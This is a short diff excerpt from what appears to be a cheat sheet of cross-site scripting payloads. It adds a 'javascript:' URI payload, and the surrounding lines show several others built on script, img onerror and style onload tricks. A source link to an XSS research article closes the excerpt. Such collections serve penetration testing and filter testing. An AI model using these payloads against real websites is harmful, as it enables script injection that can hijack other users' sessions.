@@ -140,6 +140,7 @@ alert;pg("XSS")
 <script>function::['alert'](1)</script>
 <--`<img/src=`%20onerror=confirm``>%20--!>  
 <style/onload=alert(45)>  
+javascript://%0aalert(1)  
   
 ## Source::  
 [https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/](https://research.digitalinterruption.com/2018/12/18/a-deeper-look-into-xss-payloads/)  
